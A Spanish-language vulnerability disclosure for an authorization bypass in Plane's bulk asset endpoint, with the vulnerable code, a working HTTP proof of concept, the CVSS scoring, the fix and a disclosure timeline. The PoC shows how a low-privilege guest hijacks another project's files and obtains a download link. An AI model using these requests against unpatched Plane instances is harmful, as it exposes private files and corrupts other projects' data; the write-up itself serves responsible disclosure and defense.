# CVE-2026-105637: Hijacking de assets cross-project en Plane, el endpoint hermano que dos CVEs dejaron pasar

**Publicado:** 2026-10-05 **Reportado:** 2026-05-23 **Severidad:** 9.6 Crítica **Estado:** Corregido en Plane 1.4.0 (GHSA-r2hw-fff3-pjwp) **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key)

---

El `ProjectBulkAssetEndpoint` de Plane busca los file assets que va a reasignar por workspace y por los UUIDs que manda el caller, nunca por el project de la URL. El decorador de permisos chequea que el caller tenga al menos GUEST en el project de la URL, cosa que el atacante cumple con un project que él mismo creó. Un GUEST del workspace postea el UUID del asset de otro project a la ruta bulk de su propio project, el `project_id` y el `issue_id` del asset se reescriben a los suyos, y Plane después le entrega una URL presignada de S3 para un archivo que treinta segundos antes le había negado. Dos CVEs previos ya habían parcheado exactamente esta clase de bug en endpoints vecinos. Este no estaba en ninguno de los dos sets.

---

## Contexto

Plane ya había shippeado dos fixes de esta forma para cuando yo miré.

CVE-2026-27705 parcheó `ProjectAssetEndpoint.patch`, la ruta de update de un asset solo. CVE-2026-46558 (GHSA-grcw-rwjr-ww79, publicado 2026-05-15) parcheó `WorkspaceFileAssetEndpoint` y `DuplicateAssetEndpoint`. El reportero de ese segundo escribió algo que vale la pena citar, como Mitigation #6:

> Review other V2 asset flows for the same pattern. ... A full audit of all asset routes is recommended.

Esa recomendación no se ejecutó. Así que la pregunta útil no era "¿Plane tiene un IDOR de assets?" sino "¿qué call sites de `FileAsset.objects.filter(...)` siguen seleccionando filas por UUIDs del caller sin re-scopearlas al project de la URL?". Mapear todos los call sites en `apps/api/plane/app/views/asset/v2.py` saca uno que los dos patches nunca tocaron, y resulta ser el que escribe.

## El bug

`apps/api/plane/app/views/asset/v2.py`, en `ProjectBulkAssetEndpoint.post` tal como estaba en v1.3.1:

```python
@allow_permission([ROLE.ADMIN, ROLE.MEMBER, ROLE.GUEST])
def post(self, request, slug, project_id, entity_id):
    asset_ids = request.data.get("asset_ids", [])
    if not asset_ids:
        return Response({"error": "No asset ids provided."}, status=status.HTTP_400_BAD_REQUEST)

    # el único scope es workspace + los IDs que manda el caller
    assets = FileAsset.objects.filter(id__in=asset_ids, workspace__slug=slug)

    asset = assets.first()
    if not asset:
        return Response({"error": "The requested asset could not be found."}, status=status.HTTP_404_NOT_FOUND)

    if asset.entity_type == FileAsset.EntityTypeContext.ISSUE_DESCRIPTION:
        try:
            assets.update(issue_id=entity_id, project_id=project_id)
        except IntegrityError:
            pass
    ...
```

Para que esto sea explotable se tienen que alinear dos cosas independientes, y las dos se alinean.

El queryset está scopeado a `workspace__slug` y a los UUIDs del body. `project_id` es un parámetro de la función, disponible y sin usar en el lookup. Cualquier asset del workspace matchea si el caller conoce su UUID.

El decorador `@allow_permission([ADMIN, MEMBER, GUEST])` hace bien su trabajo, y esa es la parte que vale la pena mirar con calma. Verifica que el caller tenga al menos GUEST en el `project_id` de la URL. No tiene opinión sobre los assets, porque no puede tenerla: nunca ve `asset_ids`. El atacante manda un `project_id` del que es ADMIN, porque ese project lo creó él, y la puerta se abre. El chequeo y los datos que supuestamente protege están scopeados a dos cosas distintas.

Después `assets.update(...)` escribe. No es un leak de lectura, es una escritura sobre filas a las que el caller no tiene acceso.

La rama que se toma depende de `entity_type`, y cada una reescribe una foreign key distinta:

| `entity_type` | campo reasignado | efecto |
|---|---|---|
| `PROJECT_COVER` | `project_id`, `cover_image_asset_id` | se toma el cover del project víctima |
| `ISSUE_DESCRIPTION` | `issue_id`, `project_id` | los uploads del issue privado de la víctima caen en el issue del atacante |
| `COMMENT_DESCRIPTION` | `comment_id` | los adjuntos de comentarios de la víctima se reapuntan |
| `PAGE_DESCRIPTION` | `page_id` | los adjuntos de páginas de la víctima se reapuntan |
| `DRAFT_ISSUE_DESCRIPTION` | `draft_issue_id` | los uploads de drafts de la víctima se reapuntan |

La reasignación sola ya sería un bug de integridad. Lo que la convierte en disclosure es que los endpoints de lectura le creen a la fila. `WorkspaceFileAssetEndpoint.get` filtra solo por `workspace__slug`, y `ProjectAssetEndpoint.get` matchea contra el nuevo `project_id`, que ahora es el del atacante. El archivo sigue a su foreign key hasta el project del atacante, y el flujo normal de descarga hace el resto.

## PoC

Plane CE v1.2.3 levantado con el `deployments/cli/community/docker-compose.yml` oficial. Un workspace compartido. Bob es ADMIN del project `PVA` con `secret_roadmap.pdf` adjunto a uno de sus issues. Alice es GUEST del workspace con su propio project `PAT` y un issue vacío, y no es member de `PVA`.

**Paso 1.** Alice pide el asset de Bob directo, por el project de Bob, para fijar la baseline:

```console
GET /api/assets/v2/workspaces/shared-ws/projects/d086b5cf-d7b2-44be-9726-07c98f0a6229/087f535a-933e-43b7-b579-c0392e03c841/
Cookie: session-id=<alice>

HTTP/1.1 403 Forbidden
{"error":"You don't have the required permissions."}
```

Negado, correctamente. Alice no es member de ese project.

**Paso 2.** Alice postea el mismo UUID de asset a la ruta bulk de **su propio** project y **su propio** issue:

```console
POST /api/assets/v2/workspaces/shared-ws/projects/93842268-d2ac-4844-9f96-9c182eb7119d/63b776f8-9c7f-409b-b3ad-8bfc36ef431f/bulk/
Cookie: session-id=<alice>
X-Csrftoken: <alice csrf>
Content-Type: application/json

{"asset_ids": ["087f535a-933e-43b7-b579-c0392e03c841"]}

HTTP/1.1 204 No Content
```

**Paso 3.** La fila se movió:

```
asset 087f535a-933e-43b7-b579-c0392e03c841
  antes:    project_id=d086b5cf... (PVA de Bob)    issue_id=f52237b9... (issue de Bob)
  después:  project_id=93842268... (PAT de Alice)  issue_id=63b776f8... (issue de Alice)
```

**Paso 4.** Alice repite el request del paso 1, cambiando solo el project del path por el suyo:

```console
GET /api/assets/v2/workspaces/shared-ws/projects/93842268-d2ac-4844-9f96-9c182eb7119d/087f535a-933e-43b7-b579-c0392e03c841/
Cookie: session-id=<alice>

HTTP/1.1 302 Found
Location: http://localhost:18080/uploads/eb01f709-.../25e50f902e8b4d93bc8d7ec9840dddab-secret_roadmap.pdf?<presigned signature>
```

La URL presignada la firma el storage backend y la honra cualquier cliente HTTP, así que de ahí en adelante la capa de autorización de Plane queda afuera. Mismo asset, mismo usuario, 403 en el paso 1 y una credencial de descarga en el paso 4. Lo único que cambió entre los dos es un `POST`.

## Impacto

Un GUEST del workspace, el rol más bajo de Plane, operando enteramente dentro de endpoints que está autorizado a llamar, puede leer los file assets privados de cualquier otro project reasignándolos a un project que controla y después disparando el flujo normal de URL presignada. También puede dejar a un project víctima sin su cover, sus adjuntos o sus assets de páginas, reemplazar el cover de un project por contenido elegido por él, y relocalizar cualquier archivo subido alcanzable por los entity types de arriba. El archivo de la víctima se va de su project y no vuelve solo.

El atacante necesita los UUIDs de los assets. En la práctica no son secretos. Aparecen en links de issues compartidos y en embeds, porque el render de markdown inlinea `<img src="/api/assets/v2/.../<uuid>">`. También aparecen en los listados de assets del workspace, en exports, en vistas imprimibles, y en referrer headers de la navegación normal dentro del workspace.

**CVSS 3.1:** 9.6 Crítica, `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N`. El `S:C` es la métrica que hace el trabajo acá: el componente vulnerable es el borde de autorización de un project y el componente impactado es el de otro, así que el scope cambia. Vale aclarar que yo propuse ese vector en el reporte pero lo puntué 8.7, que fue un error aritmético mío. GitHub puntuó el mismo vector correctamente en 9.6 al publicarlo.

Afectados: Plane `<= 1.3.1`, explotado de punta a punta en v1.2.3, mismo código presente en v1.3.1 y en `preview` HEAD `039d582`.

## Fix

El patch obvio es agregar el filtro que falta, y eso fue lo que sugerí en el reporte:

```python
assets = FileAsset.objects.filter(
    id__in=asset_ids,
    workspace__slug=slug,
    project_id=project_id,   # agregar esto
)
```

Resulta que está mal, y de una forma interesante. Este endpoint existe para *asociar* assets recién subidos, y un asset recién subido todavía no está scopeado a un project. Una imagen de cover subida durante la creación del project tiene `project_id=NULL` hasta que esta misma llamada se lo setea. Filtrar por `project_id=project_id` no devuelve nada para esa fila, el endpoint tira 404, y se rompe la creación de projects.

El patch de 1.4.0 resuelve el problema de autorización sin esa regresión, scopeando por ownership en vez de por ubicación:

```python
assets = FileAsset.objects.filter(
    id__in=asset_ids,
    workspace__slug=slug,
    created_by=request.user,
).filter(Q(project_id=project_id) | Q(project_id__isnull=True))
```

Ahora un caller solo puede tocar assets que subió él, y solo los que ya están en este project o todavía no están asociados a ninguno. Alice no puede nombrar el asset de Bob porque lo subió Bob, y no puede traerse un asset de un tercer project porque su `project_id` no es ni el de ella ni null. El flujo legítimo de "asociá mi upload nuevo" sigue funcionando porque `project_id IS NULL` está permitido. `@allow_permission` sigue encargándose del lado del project.

Corregido en Plane 1.4.0, publicado el 2026-07-31.

## Disclosure

| Fecha        | Evento                                                       |
|--------------|---------------------------------------------------------------|
| 2026-05-21   | Barrido de variantes sobre las rutas v2 de assets contra `preview` HEAD `039d582` |
| 2026-05-23   | Explotado de punta a punta en CE v1.2.3, reportado vía GitHub Security Advisory |
| 2026-07-31   | El fix sale en Plane 1.4.0                                   |
| 2026-08-03   | Publicado GHSA-r2hw-fff3-pjwp, asignado CVE-2026-105637       |

Gracias al equipo de Plane, que tomó el reporte, y que detectó que mi filtro sugerido habría roto la creación de projects.

## Takeaways

El reportero de CVE-2026-46558 le dijo a los maintainers dónde mirar después, en el advisory mismo, y la auditoría de seguimiento no pasó. No es raro. Un patch cierra el endpoint del reporte porque es el endpoint que viene con un PoC funcionando, y la frase que recomienda un barrido más amplio no trae ni PoC ni ticket. Se lee como consejo, no como trabajo.

Lo que convierte a las notas de mitigación de un advisory publicado en un buen punto de arranque para un variant hunt. El reportero ya hizo la parte difícil, que es nombrar el patrón y el archivo donde vive. Chequear si alguien lo ejecutó cuesta una tarde de leer call sites.

Lo segundo es que `@allow_permission` acá no es un chequeo roto. Responde la pregunta que le hacen, sobre el rol del caller en el project de la URL, y la responde bien. El bug es que nadie hace la otra pregunta, sobre si los objetos del body pertenecen a ese project. Un decorador que lee la URL no puede validar un request body que nunca ve, y un endpoint que toma IDs de objetos del body necesita su propio scoping en el queryset. Esos dos viven en lugares distintos del código, que es justo por lo que el gap es fácil de pasar por alto y se repite en un endpoint nuevo cada vez.

## Links

- Advisory: https://github.com/makeplane/plane/security/advisories/GHSA-r2hw-fff3-pjwp
- Registro CVE: https://www.cve.org/CVERecord?id=CVE-2026-105637
- Advisory padre (CVE-2026-46558): https://github.com/makeplane/plane/security/advisories/GHSA-grcw-rwjr-ww79
- Plane: https://github.com/makeplane/plane
- CWE-639: https://cwe.mitre.org/data/definitions/639.html
